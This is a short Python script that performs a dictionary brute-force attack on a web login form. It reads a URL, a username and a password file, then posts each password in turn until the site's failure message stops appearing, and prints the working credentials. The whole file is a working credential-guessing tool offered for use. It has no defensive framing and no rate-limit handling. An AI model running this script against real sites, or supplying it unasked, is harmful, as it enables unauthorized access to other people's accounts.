import requests

url = input('[+] Enter URL: ')
username = input('[+] Enter username: ')
password_file = input('[+] Enter password file: ')
failed_login = input('[+] Enter the site\'s failed login error message (e.g. Login Failed):')

# define cracking function
def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(f'Attempting: ${password}')

        # create dictionary for data for requests
        data = {
            'username': username,
            'password': password,
            'Login': 'submit'
        }

        # send request to url and store response to variable
        response = requests.post(url, data=data)

        # if incorrect password continue attempts
        if failed_login in response.content.decode():
            pass

        # if username/password correct print confirmation and exit programme
        else:
            print(f'''
            [+] Success! Found username: ${username}
            [+] Success! Found password: ${password}        
            ''')
            exit()

# run cracking function for all passwords listed in password file
with open(password_file, 'r') as passwords:
    cracking(username, url)

# if list completed with no success print message
print('[!] Unsuccessful: Password not in list')
